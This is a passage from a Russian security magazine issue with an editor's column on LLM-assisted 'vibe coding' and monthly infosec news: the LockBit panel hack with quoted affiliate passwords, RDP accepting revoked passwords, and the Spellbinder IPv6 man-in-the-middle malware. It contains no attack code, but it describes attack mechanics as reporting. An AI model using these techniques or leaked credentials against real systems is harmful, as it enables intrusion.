
            № 314
CONTENTS


    Вайбколхозинг
  Колонка главреда

   MEGANews
  Cамые важные события в мире инфосека за май

     Passive Recon
  Составляем полный воркфлоу для тихой разведки

     Active Recon
  Составляем пошаговый план активной разведки

    Пентест провайдера
  Как цепочка классических багов привела к полной компрометации

   В кроличьей норе
  Штурмуем отладочную консоль «Яндекс Станции»

    Автоматизация IDA Pro
  Дорабатываем «Иду» напильником

    Сапфировый билет
  Подделываем TGT с чужими привилегиями

    Уроки форензики
  Создаем профиль Volatility для анализа инцидентов в Linux

    Автоматизируем x64dbg
  Как превратить отладчик в хакерский комбайн

    Modologic
  Декомпилируем проприетарный ассемблер в си-код

    HTB Heal
  Эксплуатируем LFI в проекте Rails

    HTB UnderPass
  Используем Mosh для получения сессии на сервере

    HTB BigBang
  Эксплуатируем баг в glibc для получения RCE

    HTB EscapeTwo
  Захватываем домен техникой ESC4 ADCS

    Браузер в браузере
  Разбираем простую, но эффективную технику кражи учетных данных

    Охота на «Даркулу»
  Заглядываем за кулисы глобального фишинга

    Слушай сердце
  Пишем тулзу для перехвата учеток

    Непростой Macronix
  Расширяем перечень микросхем, подвластных UNO-программатору

    Регенератор
  Возрождаем технологии XX века 100 лет спустя
HEADER





С момента появления ChatGPT идут споры
о его применимости в разных областях.
Пожалуй, самая важная из них —  прог‐
раммирование. Давай разберемся, почему
разговоры про «вайбкодинг» выводят прог‐       АндрейГлавныйПисьменныйредактор
раммистов     из    себя     примерно         apismenny@gmail.com
за 0,01 секунды и правы ли они в своем
гневе.


Современные языковые модели прекрасно умеют выплевывать куски кода,
когда их об этом попросят. Зачастую эти куски даже работают и делают то,
что нужно.
   Эксплуатацию  этого  явления  программистами  уже  не  остановить.
ИИ‑автокомплит теперь неотъемлемая часть программирования — наравне
с обычным автокомплитом и линтером.
   Впрочем, сравнивать стоит скорее с подрезанием готового кода на Stack
Overflow. Кстати, трафик этого кладезя знаний уже вошел в крутое пике —
именно благодаря вездесущим LLM.
   Пользу языковых моделей признают и некоторые мастодонты кодинга.
Вот, например, недавний твит Джона Кармака:

       ИИ‑программирование часто используется для генерации большого объема
       кода, который нередко принимается бездумно. Но похоже, у ИИ есть« не меньше потенциала и для того, чтобы делать кодовую базу красивее.
          Поддерживать код в хорошем состоянии или распутывать клубок старого
      хаоса требует усилий… и неутомимый ИИ‑помощник, который постоянно
       просматривает код и предлагает улучшения, может быть очень полезен.
     ИИ — как прилежный член команды, а не волшебник, исполняющий желания.                 »Как видишь, среди похвалы есть и наезд: Кармак осуждает «бездумное при‐
менение большого объема сгенерированного кода». А это, друзья мои,
и есть наш вайбкодинг.
  При некоторой изворотливости LLM можно использовать, чтобы писать
код вообще без знаний о языке. Точно так же, как диффузионные модели поз‐
воляют «рисовать», не притрагиваясь к инструментам.
   Да, такой код часто потом не работает, но вайбкодер, раскачиваясь
под классную музычку, шлет ошибку и трейс обратно модели и требует
починить. Если прокатило, то можно просить новую фичу, и она тоже появится
как по волшебству.
   Совру, если скажу, что сам никогда так не делал. Например, прошлая
колонка была проиллюстрирована картинкой, где золотой ZX Spectrum стоит
на  пьедестале. Она, между  прочим,  сделана по всем правилам  спек‐
трум‑арта.


             INFO

                     ZX  Spectrum  имел  интересное  ограничение:
                      при  наличии  восьми  цветов и  двух  уровней
                         яркости, в квадрате 8 на 8 пикселей могло при‐
                             сутствовать  только два  разных  цвета. Отсюда
                      и квадратики на сконвертированных картинках.
                        Настоящие художники‑спектрумисты умеют ловко
                           избегать этого эффекта.


Сначала я пытался выпросить что‑то в духе «Спектрума» у ChatGPT, но быстро
разочаровался: соблюдать такие четкие правила при генерации картинок он,
конечно, не умеет.
   Зато нейронка может накатать несколько сот строк на Python, которые
будут конвертировать любую картинку в формат ZX Spectrum. Хоть записывай
на кассету и смотри на ЭЛТ‑телевизоре!





                       Фрагмент кода конвертера





               Сконвертированная картинка в эмуляторе Fuse

При этом я не объяснял ни что такое ZX Spectrum, ни какая у него палитра,
не давал примеров формата SCR — все это LLM уже знает и бодро выдает
готовый конвертер строчка за строчкой.
   Глядя на результаты, я подумал: выходит в целом ничего, но вот бы
еще вручную подкручивать порог, при котором какой‑то оттенок переходит
в целевой цвет палитры ZX Spectrum...
   Сказано — сделано! Еще пара запросов, и у меня есть GUI: крутишь пол‐
зунки и сразу смотришь, что получится.





                             Конвертер с GUI

Можно ли так делать код для продакшена? Да нет, конечно! Даже если все
запустится, это прямая дорога в ад.
  Ты обязательно нарвешься на баги, проблемы с масштабируемостью
и безопасностью. При этом программа быстро раздуется настолько, что ней‐
ронка сама перестанет в ней ориентироваться. В этот момент весь «вайбкод»
нужно выкинуть на помойку и делать всё заново — по‑человечески.
  В принципе, на этом дискуссию можно закрывать — как минимум до тех
пор, пока модели не выйдут на принципиально новый уровень. Но я все же
вижу случаи, когда вайбкодинг — не совсем безумная затея.
  В одной из предыдущих колонок я уже защищал казуальное умение
кодить — с целью лучше управлять компьютером, а не создавать продукты.
   Например, если у тебя есть трактор, хорошо бы уметь на нем пахать, а не
только кататься. Ну а в случае с компьютером — заставлять машину делать
рутинные операции в цикле.
   У «вайбкодинга», на мой взгляд, огромный потенциал именно в создании
инструментов, которые выполняют одну задачу для одного пользователя.
Думаю, ты много раз сталкивался с тем, что нужно что‑то по‑быстрому накол‐
хозить для решения сиюминутной проблемы. И тут я могу привести далеко
не только экзотические примеры про ZX Spectrum.
  По работе у меня то и дело возникают задачи, связанные с манипуляцией
данными. Скажем, подключиться к базе и сделать какой‑то запрос, отсорти‐
ровать результаты, сохранить как JSON, отфильтровать так и этак по одним
полям, что‑то поискать в других регулярками, соскрэпить что‑то с веба, сос‐
тавить статистику и так далее.
  Все это требует несложного, но утомительного кодирования. Каждый вто‐
рой скрипт делает одно и то же: чтение данных откуда‑то, итерация по ним,
проверка какого‑то условия, сохранение.
  С LLM можно не писать все циклы и условия, а только показать, как выг‐
лядит ввод, описать вывод и перечислить условия сортировки. Остальное
компьютер делает сам, и в большинстве случаев в код действительно можно
не вчитываться — по результатам работы и так всё ясно.
   То есть то, для чего раньше нужно было разбираться со скриптовым язы‐
ком и писать программу, теперь делается простым описанием на естествен‐
ном языке. И это очень серьезный и важный сдвиг в компьютинге.
   Больше не обязательно с трудом вспоминать ключи к развесистым прог‐
раммам вроде ImageMagick, youtube-dl или FFmpeg. Заодно можно спокойно
забыть синтаксис jq и XPath.
   Только не подумай, что я кого‑то отговариваю учиться кодить. «Не обя‐
зательно» не значит «не нужно». Чтение мануалов по языкам — это по‑преж‐
нему прекрасное вложение времени и сил, даже если цель — программи‐
ровать с помощью LLM.
   Если человек способен прочитать код, выдаваемый ИИ, ему открываются
качественно другие возможности. При минимальных архитектурных навыках
можно заставить нейронку написать тысячи строк рабочего кода, а не сотни.
   Проси небольшие функции с понятным входом и выходом, заставляй
модель использовать типизацию и писать докстринги (если речь о Python),
требуй понятные датаклассы вместо структур, и вместе сможете делать нам‐
ного более мощные инструменты.
  А еще из нейронки всегда можно извлечь не только готовый код, но и цен‐
ные знания. Попалась неизвестная конструкция? Проси объяснить и показать
на примерах. Не знаешь, как лучше сделать? Запроси варианты со сравнени‐
ем. Есть подозрение, что код багованный? Докопайся, и будешь знать боль‐
ше.
   Короче, от вайбкодинга — к вайблернингу!
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: произошла утечка SMS-сообщений поль‐
зователей Steam, обнаружен взлом партнерской админки
LockBit,  исследователи  пытаются  привлечь  внимание
Microsoft к проблеме в RDP, протокол IPv6 используется
в атаках, инсайдеры в поддержке Coinbase продали данные
пользователей хакерам, а также другие интересные и важ‐
ные новости мая.





АДМИНКУ LOCKBIT
ВЗЛОМАЛИ
Вымогательская группировка LockBit пострадала от утечки данных. Некто
взломал панели администратора, предназначенные для партнеров группы,
похитил данные, дефейснул админку и оставил послание: «Не совершайте
преступлений, ПРЕСТУПЛЕНИЯ — ЭТО ПЛОХО, xoxo из Праги».
  От похожего взлома в апреле 2025 года пострадала другая хакгруппа —
Everest. Тогда злоумышленник оставил такое же сообщение на взломанном
сайте, однако о краже данных ничего не сообщалось.
  В случае LockBit хакер прикрепил к своему сообщению ссылку на скачива‐
ние архива paneldb_dump.zip. Этот архив содержит SQL-файл, полученный
из БД MySQL партнерской панели администратора.





                         Сообщение неизвестного хакера

Суммарно этот дамп содержит двадцать таблиц, включая:
 • таблицу btc_addresses c 59 975 уникальными биткоин‑адресами;
 • таблицу builds, содержащую отдельные сборки, созданные партнерами
   LockBit для атак. В строках таблицы перечислены публичные ключи, но нет
   приватных. Для некоторых билдов также приведены названия целевых
   компаний‑жертв;
 • таблицу builds_configurations, которая содержит различные конфигурации,
   используемые для каждой сборки, например какие серверы ESXi пропус‐
   кать или какие файлы шифровать;
 • таблицу chats, где можно прочитать 4442 сообщения — переговоры между
   вымогателями и  их  жертвами за  период с 19  декабря 2024 года
   по 29 апреля 2025 года;
 • таблицу users, в которой перечислены 75 администраторов и партнеров
   LockBit, имевшие доступ к партнерской панели. При этом пароли хакеров
   хранились   в    открытом   виде    (среди    них:   Weekendlover69,
   MovingBricks69420 и Lockbitproud231).

Судя по времени создания MySQL-дампа и последней записи о дате в таб‐
лице chats, взлом и утечка произошли 29 апреля 2025 года.





                               Содержимое chats

Представитель группировки, известный под ником LockBitSupp, подтвердил
факт взлома и сообщил, что обошлось без утечки закрытых ключей и потери
данных.
   Неизвестно, кто может стоять за взломом LockBit и Everest и какие цели
преследует этот хакер.


39% РОССИЯН НИКОГДА НЕ МЕНЯЛИ ПАРОЛЬ РОУТЕРА
Согласно опросу «Лаборатории Касперского», более трети пользователей ( 39% ), у которых
дома настроен Wi-Fi, никогда не меняли пароль от домашнего роутера.

Каждый пятый ( 18% ) создавал новую комбинацию, но не сразу.

Только 27% опрошенных позаботились об обновлении учетных данных сразу после покупки
устройства.





MICROSOFT
ИГНОРИРУЕТ
ПРОБЛЕМУ RDP
Исследователи обнаружили, что протокол RDP (Remote Desktop Protocol)
в Windows позволяет использовать уже отозванные пароли для входа в сис‐
тему. В ответ на это представители Microsoft сообщили, что такое поведение
не является уязвимостью, в компании не планируют что‑либо менять.
    Хотя смена пароля — один из первых шагов, которые следует предпринять
в случае утечки пароля или взлома учетной записи, в случае с RDP все может
быть не так просто.
   Независимый ИБ‑исследователь Дэниел Уэйд (Daniel Wade) обнаружил,
что во многих случаях RDP будет продолжать доверять паролю даже после
того, как пользователь его изменил. Эксперт уведомил  представителей
Microsoft о проблеме и составил пошаговую инструкцию для воспроизве‐
дения такого поведения.
   Как подчеркивает Уэйд, это противоречит всем общепринятым представ‐
лениям о том, что после смены пароля тот больше не может предоставлять
доступ к устройствам и учетным записям, связанным с ним.


      Это не просто ошибка. Это полный подрыв доверия, — пишет эксперт
      в своем отчете. — Люди верят, что смена пароля отсечет несанкци‐«
       онированный доступ. Это первое, что делает человек, заподозривший
       компрометацию. И все же:
     • старые учетные данные продолжают работать в RDP даже с совер‐
        шенно новых машин;
     • Defender, Entra ID и Azure не отображают никаких предупреждений;
     • у конечных пользователей нет никакого способа для обнаружения
        и устранения проблемы;
     • нет документации или руководств Microsoft, которые напрямую рас‐
         сматривали бы подобные сценарии;
     • даже более новые пароли могут игнорироваться, тогда как старые
          продолжают работать.

        Результат? Миллионы пользователей (дома, на малых предприятиях
      или в гибридных средах) неосознанно подвергаются риску.                »
Возможность использования отозванного пароля для входа через RDP воз‐
никает в том случае, если Windows-машина, подключенная к учетной записи
Microsoft или Azure, разрешает удаленный доступ к рабочему столу. В этом
случае пользователи могут входить в систему через RDP, с помощью спе‐
циального пароля, который сверяется с локально хранящимися учетными
данными. Также можно войти в систему, используя данные онлайновой учет‐
ной записи, которая использовалась для входа на машину.
   Проблема заключается в том, что даже после смены пароля тот остается
действительным для входа через RDP на неопределенный срок. По словам
Уэйда, встречаются случаи, когда некоторые старые пароли продолжают
работать, а новые — нет. В результате можно иметь постоянный доступ к RDP
в обход облачной верификации, многофакторной аутентификации и политик
Conditional Access.
   Исследователь поясняет, что такое поведение может обернуться боль‐
шими потерями в случае, если учетная запись Microsoft или Azure скомпро‐
метирована и пароли стали достоянием общественности. В такой ситуации
первым делом нужно сменить пароль, чтобы не дать злоумышленникам воз‐
можности использовать его для доступа к важным ресурсам. Однако если
смена пароля не позволит атакующим войти в учетную запись Microsoft
и Azure, то старый пароль все равно будет предоставлять доступ к машине
через RDP.


      Это создает незаметный удаленный бэкдор к любой системе, где ког‐
      да‑либо был кеширован пароль, — пишет Уэйд. — Даже если у зло‐«
       умышленника никогда не было доступа к этой системе, Windows все
       равно будет доверять паролю.                »
Корень этой проблемы кроется в механизме кеширования учетных данных
на жестком диске локальной машины. Так, при первом входе пользователя
в систему с использованием учетных данных Microsoft или Azure RDP под‐
тверждает действительность пароля в режиме онлайн. Затем Windows сох‐
раняет учетные данные в криптографически защищенном формате на локаль‐
ной машине.
  С этого момента система будет проверять любой пароль, введенный
при входе через RDP, сравнивая его с локально хранящимися учетными дан‐
ными. При этом аннулированный пароль по‑прежнему будет работать.
  В ответ на это представители Microsoft заявили, что описанное Уэйдом
поведение является «конструктивным решением, призванным гарантировать,
что хотя бы одна учетная запись пользователя всегда имеет возможность
войти в систему, независимо от того, как долго она находилась в автономном
режиме».
  При этом исследователю сообщили, что он не первый, кто уведомляет
об этой проблеме, и Microsoft знает о ней уже около двух лет:

       Изначально  мы   рассматривали   возможность   изменения  кода
      для  решения  этой  проблемы,  но  после  дальнейшего  изучения«
      документации оказалось, что изменения в коде могут нарушить сов‐
      местимость с функциональностью, используемой многими приложе‐
      ниями.                »
При этом подчеркивается, что такое поведение не является уязвимостью
и инженеры Microsoft не планируют ничего менять. Однако компания все же
обновила онлайн‑документацию , чтобы пользователи были лучше осведом‐
лены о таком поведении. В обновлении говорится:


       Когда пользователь выполняет локальный вход в систему, его учетные
       данные проверяются локально с помощью кешированной копии, преж‐«
      де чем пройти аутентификацию в онлайне, с помощью провайдера
       идентификации. Если проверка кеша прошла успешно, пользователь
       получает доступ к рабочему столу, даже если устройство работает
      в  автономном режиме.  Однако если  пользователь  меняет пароль
      в облаке, кешированный верификатор не обновляется, а значит, он
      все равно может получить доступ к локальной машине, используя ста‐
     рый пароль.                »
Как сообщил изданию известный ИБ‑эксперт Уилл Дорманн (Will Dormann),
большинство администраторов могут попросту не заметить это обновление.
К тому же Microsoft не  указывает, какие действия следует предпринять
для блокировки RDP в случае взлома учетной записи Microsoft или Azure.
По словам специалиста, единственным вариантом остается настройка RDP
на аутентификацию только по локально хранящимся учетным данным.

     С  точки зрения безопасности это просто бессмыслица, — говорит
      Дорманн. — Если бы я был системным администратором, я бы ожи‐«
       дал, что, как только я изменю пароль для учетной записи, старые
       учетные данные для нее больше нельзя будет использовать нигде.
       Однако это не так.                »

DDOS-АТАК СТАЛО НА 358% БОЛЬШЕ

Компания  Cloudflare  сообщила,  что  предотвратила  рекордное  количество  DDoS-атак
в 2024 году. Количество инцидентов увеличилось на 358% по сравнению с предыдущим годом
и на 198% по сравнению с предыдущим кварталом.


В отчете за первый квартал 2025 года компания пишет, что в 2024 году она ликвидировала
в общей сложности 21,3 миллиона DDoS-атак. При этом специалисты считают, что 2025 год
обещает стать еще более сложным: только в первом квартале Cloudflare уже отреагировала
на 20,5 миллиона инцидентов.

16,8 миллиона из них были атаками сетевого уровня.

Основным фактором роста количества DDoS-инцидентов стали атаки сетевого уровня, количес‐
тво которых увеличилось на 509% по сравнению с предыдущим годом.





                               Общая статистика за последний год


Среди целей этих атак была и сама компания Cloudflare, чья инфраструктура подверглась
6,6 миллиона атак в ходе 18-дневной многовекторной кампании, включавшей SYN-флуд,
DDoS-атаки, генерируемые Mirai, атаки с усилением через SSDP и другие.





                                                Атака на Cloudflare


Не ослабевает и тенденция по увеличению числа гиперобъемных атак: компания зафиксирова‐
ла более 700 атак, мощность которых превышала 1 Тбит/с и 1 миллиард пакетов в секунду.

В первом квартале 2025 года количество гиперобъемных атак составляло в среднем 8 в день,
и по сравнению с предыдущим кварталом их количество удвоилось.





СОТРУДНИК XAI СЛИЛ
ДАННЫЕ
Как сообщил известный журналист‑расследователь Брайан Кребс  (Brian
Krebs), сотрудник  xAI  случайно опубликовал на GitHub  приватный ключ.
На протяжении двух месяцев этот ключ был доступен, позволяя любому жела‐
ющему запрашивать закрытые большие языковые модели (LLM), которые,
судя по всему, были созданы специально для работы с внутренними данными
компаний Илона Маска, включая SpaceX, Tesla и X.
   Первым эту утечку заметил и предал огласке специалист компании Seralys
Филипп Катурельи (Philippe Caturegli), который обнаружил, что сотрудник xAI
случайно добавил на GitHub API-ключ x.ai.
   Сообщение Катурельи привлекло внимание исследователей из компании
GitGuardian, специализирующейся на обнаружении и устранении утечек сек‐
ретов в публичных и проприетарных средах. Так, системы GitGuardian пос‐
тоянно сканируют GitHub и другие репозитории на предмет раскрытия ключей
API и отправляют автоматические оповещения пострадавшим.
   Специалист GitGuardian Эрик Фуррье (Eric Fourrier) рассказал Кребсу, что
утекший  API-ключ,  например, давал  доступ  к  нескольким непубличным
моделям чат‑бота Grok. В общей сложности в GitGuardian обнаружили, что
ключ предоставлял доступ как минимум к 60 кастомным и приватным LLM.


       Учетные данные могли использоваться для доступа к API x.ai под лич‐
      ностью пользователя, — сообщают в GitGuardian. — Связанная с ним«
       учетная запись имела доступ не только к публичным моделям Grok
      (grok-2-1212 и так далее), но и к еще не выпущенным (grok-2.5V),
       находящимся в  разработке  (research-grok-2p5v-1018) и  приватным
       (tweet-rejector, grok-spacex-2024-11-04).                »
Фуррье сообщил, что GitGuardian предупредила сотрудника xAI об утечке API-
ключа почти два месяца назад — 2 марта 2025 года. Однако по состоянию
на 30 апреля 2025 года, когда компания напрямую уведомила команду
безопасности xAI о раскрытии ключа, тот все еще был действителен и при‐
годен для использования. В xAI порекомендовали исследователям сообщить
о проблеме через программу bug bounty на HackerOne, однако через нес‐
колько часов репозиторий с раскрытым ключом был удален с GitHub.

       Похоже, что некоторые из этих внутренних LLM были обучены на дан‐
      ных SpaceX, а некоторые — на данных Tesla, — пишет Фуррье. —«
     Не думаю, что модель Grok, настроенная на данных SpaceX, пред‐
       назначалась для публичного доступа.                »
Специалисты отметили, что свободный доступ к приватным LLM может обер‐
нуться настоящей катастрофой. Ведь злоумышленник, получивший прямой
доступ к модели и бэкенду модели, подобной Grok, способен использовать
это для последующих атак. К примеру, хакер может применить полученный
доступ для промпт‑инъекций, изменить параметры модели в своих целях
или попытаться внедрить код в цепочку поставок.


ХУАНГ О ПРИМЕНЕНИИ ИИ





Выступая на конференции Института Милкена, основатель и генеральный директор компании
Nvidia Дженсен Хуанг (Jensen Huang) рассказал о своем взгляде на рынок труда на фоне пов‐
семестного→  Выпроникновенияможете потерятьИИ:  работу не из‑за искусственного интеллекта, а из‑за
       людей, которые его используют. Я рекомендую использовать все преимущества
     ИИ на 100%, не будьте людьми, которые его игнорируют.


Глава Nvidia предложил всем начать пользоваться, например, Perplexity и ChatGPT, чтобы лучше
разобраться в этих инструментах и найти варианты возможного применения ИИ.





УТЕЧКА STEAM 2ФА
В середине мая хакер под ником Machine1337 (он же EnergyWeaponUser) выс‐
тавил на продажу массив данных, якобы содержащий 89 миллионов записей,
связанных с пользователями Steam.


                                     Продолжение статьи →
← Начало статьи





  Machine1337 заявил, что продает дамп за 5000 долларов, но в качестве
  образца выложил в открытый доступ 3000 записей, которые поспешили изу‐
   чить исследователи. В результате в дампе обнаружили SMS-сообщения
  с одноразовыми кодами, а также номера телефонов их получателей.
      Некоторые SMS явно представляли собой коды для подтверждения дос‐
   тупа к аккаунту Steam или привязки к нему телефонного номера. При этом
   часть данных была получена относительно недавно: многие записи были
   датированы началом марта.
      Сначала  эксперты  предположили,  что  инцидент может быть  связан
  со взломом PaaS-компании Twilio и ее продукта Verify API, который может при‐
   меняться для отправки SMS-сообщений, сообщений в мессенджерах, элек‐
   тронных писем, пуш‑уведомлений, голосовых вызовов и TOTP (Time-based
  One-Time Password), что широко используется во многих приложениях (вклю‐
   чая Steam) для аутентификации пользователей.
      Однако вскоре представители Twilio заявили, что не выявили в своих сис‐
  темах никаких признаков компрометации, а в Valve и вовсе сообщили, что
  не пользуются услугами Twilio.
      Другая теория гласила, что утечка могла произойти, например, на стороне
   SMS-провайдера.
     Так как эта ситуация привлекла внимание СМИ и ИБ‑экспертов, предста‐
   вители Valve поспешили успокоить общественность и опубликовали офи‐
   циальное заявление. В компании подчеркнули, что Steam точно не был взло‐
   ман, но источник утечки пока неизвестен:

          Пока мы пытаемся определить источник утечки. Ситуация осложняется
         тем, что при доставке SMS-сообщения находятся в незашифрованном «
          состоянии и проходят через разных провайдеров, прежде чем попасть
         в ваш телефон.
              Утечка состоит из старых текстовых сообщений с одноразовыми
         кодами,  действительными лишь  в  течение 15  минут, и номеров
          телефонов, на которые они отправлялись. Утекшие данные не поз‐
          воляют   идентифицировать   аккаунт,  узнать  пароль,   платежную
        информацию и другие личные данные пользователей Steam по номеру
          телефона. С помощью старых текстовых сообщений нельзя взломать
        ваш аккаунт Steam. Кроме того, каждый раз, когда вы используете
        SMS-коды для смены своего email-адреса или пароля в Steam, вам
          приходит подтверждение через электронную почту и/или защищенные
         сообщения в Steam.
           Из‑за  этого  инцидента  вам  не  нужно  менять  свои  пароли
        или номера телефонов. Однако это хорошее напоминание о том, что
          к любым сообщениям о безопасности аккаунта, которые вы не зап‐
         рашивали, следует относиться с подозрением.                 »

 46% РОССИЙСКИХ ВЕБ-ПРИЛОЖЕНИЙ СОДЕРЖАТ
 УЯЗВИМОСТИ
   По данным исследователей ГК «Солар», 46% веб‑приложений российских компаний содержат
    уязвимости, ведущие к утечкам данных. Чаще эти уязвимости опасны не только для обычных
    пользователей, но и для компаний, особенно если через приложение можно получить доступ
   к корпоративным системам.

    Также выяснилось, что более 50% веб‑приложений плохо защищены и позволяют получить
    несанкционированный доступ к данным пользователей.





 АТАКИ ЧЕРЕЗ IPV6
  В ESET сообщили, что связанная с Китаем APT-группировка TheWizards
   использует сетевую функциональность IPv6 для проведения атак типа man-in-
   the-middle, которые перехватывают обновления ПО для установки Windows-
   малвари.
     Эта группировка активна как минимум с 2022 года, атакуя организации
  на Филиппинах, в Камбодже, Объединенных Арабских Эмиратах, Китае и Гон‐
   конге. В числе жертв TheWizards — частные лица, игорные компании и другие
   организации.
    В своих  атаках хакеры используют кастомный инструмент Spellbinder,
  который злоупотребляет функцией IPv6 stateless address autoconfiguration
  (SLAAC) для проведения SLAAC-атак .
    SLAAC — это функция протокола IPv6, которая позволяет устройствам
   автоматически настраивать свои собственные IP-адреса и шлюз по умол‐
  чанию без использования DHCP-сервера. Вместо этого для получения IP-
   адресов от маршрутизаторов, поддерживающих протокол IPv6, используются
  сообщения router advertisement (RA).
      Spellbinder злоупотребляет этой функциональностью, отправляя поддель‐
  ные  RA-сообщения  и  вынуждая  близлежащие  системы  автоматически
   получать новый IPv6-адрес, новые DNS-серверы и новый, предпочтительный
   IPv6-шлюз. Адрес этого шлюза — IP-адрес Spellbinder, что позволяет зло‐
   умышленникам перехватывать соединения и перенаправлять трафик через
   подконтрольные им серверы. Эксперты ESET объясняют:


          Spellbinder отправляет пакет RA multicast каждые 200 мс на ff02::1 (все
          узлы). Windows-машины в сети с включенным IPv6 будут автоматичес‐ «
         ки конфигурироваться с помощью stateless address autoconfiguration
         (SLAAC), используя информацию, предоставленную в RA-сообщении,
        и  начнут отправлять IPv6-трафик на машину, на которой работает
          Spellbinder,  где  пакеты  будут  перехвачены,   проанализированы
        и получат ответ, если это необходимо.                 »
  По словам исследователей, Spellbinder развертывается с помощью архива
   AVGApplicationFrameHostS.zip, который распаковывается в каталог, имитиру‐
  ющий легитимное ПО: %PROGRAMFILES%\AVG Technologies.
    В этой директории находятся AVGApplicationFrameHost.exe, wsc.dll, log.dat
  и легитимная копия winpcap.exe. Исполняемый файл WinPcap используется
  для загрузки вредоносной wsc.dll, которая загружает Spellbinder в память.
      После заражения устройства Spellbinder начинает перехватывать и ана‐
   лизировать  сетевой  трафик,  отслеживая  попытки  подключения  к  ряду
  доменов, например связанным с китайскими серверами обновления ПО.
    По данным специалистов, малварь отслеживает домены, принадлежащие
   компаниям Tencent, Baidu, Xunlei, Youku, iQIYI, Kingsoft, Mango TV, Funshion,
   Youdao, Xiaomi, Xiaomi Miui, PPLive, Meitu, Qihoo 360 и Baofeng.





                             Ipconfig до и после запуска Spellbinder

   Инструмент перенаправляет запросы на загрузку и установку вредоносных
   обновлений, которые в  итоге разворачивают в системах жертв бэкдор
   WizardNet.  Он   предоставляет   злоумышленникам   постоянный   доступ
   к зараженному устройству и позволяет устанавливать дополнительную мал‐
   варь.
     Для защиты от подобных атак специалисты рекомендуют организациям
   пристально контролировать трафик IPv6 или вообще отключать этот протокол,
  если он не используется в инфраструктуре.


  887 000 АККАУНТОВ УГНАЛИ В TELEGRAM

   Специалисты F6 предупреждают: количество краж Telegram-аккаунтов растет. Только за первые
   три месяца 2025 года всего одна группировка похитила 887 000 аккаунтов. Для сравнения —
   за второе полугодие 2024 года та же группа угнала 1 200 000 профилей.

    Всего против пользователей Telegram действуют не менее шести группировок. Чаще всего
   в качестве приманки мошенники используют горячие инфоповоды и проверенные уловки: обе‐
   щают денежные призы, «раздают» бесплатные подписки и так далее.





 ONIUX
 АНОНИМИЗИРУЕТ
 ТРАФИК
   Разработчики Tor анонсировали инструмент командной строки Oniux, пред‐
   назначенный для безопасной маршрутизации любых Linux-приложений через
   сеть Tor и анонимизации сетевых соединений.
    В отличие от классических методов, которые используют user space, Oniux
   использует пространства имен (namespaces) в Linux для создания полностью
   изолированной сетевой среды для каждого приложения, предотвращая утеч‐
   ку данных, даже если приложение вредоносно или настроено некорректно.
      Linux namespaces — это функция ядра, которая позволяет процессам
  работать в изолированных средах, каждая из которых имеет собственное
   представление о конкретных системных ресурсах, например о нетворкинге
  и процессах.
     Oniux использует namespaces для изоляции приложений на уровне ядра,
   в результате чего весь трафик принудительно проходит через Tor.


      Мы рады представить Oniux: небольшую утилиту командной строки,
         обеспечивающую сетевую изоляцию сторонних приложений, которые «
         используют пространства имен Linux, посредством Tor, — говорится
         в сообщении разработчиков. — Построенная на базе Arti и onionmasq,
         Oniux помещает любую Linux-программу в собственное сетевое прос‐
          транство имен, чтобы направить ее через Tor и исключить вероятность
           утечек данных.                 »
   Нужный эффект достигается через размещение каждого приложения в собс‐
   твенном сетевом пространстве имен без доступа к интерфейсам хоста, вмес‐
   то чего используется виртуальный интерфейс (onion0), осуществляющий мар‐
   шрутизацию через Tor с помощью onionmasq.
     Кроме того, инструмент использует mount namespaces для внедрения
   собственного /etc/resolv.conf для безопасной работы с Tor DNS, а также
   user/PID namespaces для безопасной настройки среды с минимальными при‐
   вилегиями. Это позволяет обеспечить защиту от утечек и изоляцию Tor в ядре
  для любого приложения Linux.
      Разработчики объясняют, что в отличие от Oniux Torsocks работает за счет
   использования LD_PRELOAD и перехвата вызовов сетевых функций в динами‐
   чески связанных Linux-приложениях и перенаправляет их через SOCKS-прок‐
  си Tor.
     Проблема такого подхода заключается в том, что необработанные сис‐
  темные вызовы не перехватываются Torsocks, а вредоносные программы
   могут не использовать функции libc, что может привести к утечкам.
      Более того, Torsocks вообще не работает со статическими бинарниками
  и не обеспечивает настоящей изоляции, поскольку приложения все равно
   обращаются к реальным сетевым интерфейсам хоста.
    В блоге разработчики опубликовали сравнительную таблицу, в которой
   указаны различия между этими решениями.





   Несмотря на очевидные преимущества Oniux, подчеркивается, что это экспе‐
   риментальный проект, который пока не прошел всестороннее тестирование
   в разных условиях и сценариях. По этой причине инструмент может работать
   некорректно и не рекомендуется задействовать его в критически важных опе‐
   рациях.
      Вместо этого разработчики призывают энтузиастов протестировать Oniux
  и сообщить о возникших проблемах, чтобы побыстрее подготовить инстру‐
  мент к более широкому внедрению.
      Tor Project уже опубликовал исходный код Oniux и рекомендует всем, кто
   захочет его протестировать, предварительно убедиться в том, что в их дис‐
   трибутиве установлен Rust.


  88,6% МОБИЛЬНЫХ ПРИЛОЖЕНИЙ В РФ ИМЕЮТ
 УЯЗВИМОСТИ
    Аналитики AppSec Solutions провели исследование безопасности мобильных приложений.
  В выборку вошли сервисы из топ-100 по скачиванию в тематических категориях.

   Суммарно исследователи изучили 1675 мобильных приложений, от финтеха и онлайн‑ретейла
   до здравоохранения, образования и корпоративных сервисов.

    Выяснилось, что 88,6% приложений содержат уязвимости уровня critical и high.





   Суммарно в 2024 году было выявлено 29 952 уязвимости, среди них 83 критически опасных
   и 8887 высокого уровня серьезности. Для сравнения: в 2023 году среди всех 41 493 уяз‐
   вимостей было обнаружено всего 22 критических.


   Лидерами по общему количеству выявленных проблем оказались приложения в категории
   «Здоровье» . Однако большинство этих проблем носят некритический характер.

   На втором месте по уязвимостям — «Полезные инструменты» . Это самая разнообразная
    категория, куда входят прогнозы погоды, переводчики, приложения для создания нейроава‐
   таров, музыкальные плееры и даже антивирусы.





    Также отмечается, что более 30% уязвимостей в приложениях для образования были уровня
    critical и high. Так, некоторые приложения позволяют хранить чувствительные данные, включая
   пароли или персональные данные пользователей, в публичном файле, до которого без труда
   могут добраться злоумышленники.





                                        Продолжение статьи →
← Начало статьи





 ВРЕДОНОСНЫЕ
 ДРАЙВЕРЫ
 PROCOLORED
   Официальное ПО, которое поставлялось с принтерами Procolored, содер‐
  жало троян удаленного доступа и малварь для кражи криптовалюты. Произво‐
  дитель распространял зараженный софт не менее полугода.
      Китайская компания Procolored — поставщик решений для цифровой
   печати, выпускающий принтеры типа Direct-to-Film (DTF), UV DTF, UV и Direct-
   to-Garment  (DTG). В  частности,  компания широко  известна  благодаря
   недорогим продуктам, предназначенным для печати на ткани.
